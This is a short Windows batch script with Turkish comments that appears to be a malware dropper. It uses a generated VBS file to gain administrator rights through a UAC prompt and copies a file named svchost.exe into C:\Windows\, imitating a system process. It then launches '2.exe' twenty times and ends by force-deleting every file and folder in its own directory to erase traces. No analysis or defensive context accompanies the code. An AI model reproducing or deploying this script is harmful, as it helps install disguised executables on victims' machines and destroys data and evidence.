@echo off
setlocal

:: Yönetici izni kontrolü ve komut dosyasının yönetici olarak çalıştırılması
openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

set "BypassDir=C:\Windows\"
if exist "%~dp0svchost.exe" (
    copy /y "%~dp0svchost.exe" "%BypassDir%"
)


2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe
2.exe


cd /d "%~dp0"
del /f /q *.*
for /d %%i in (*) do rd /s /q "%%i"

exit
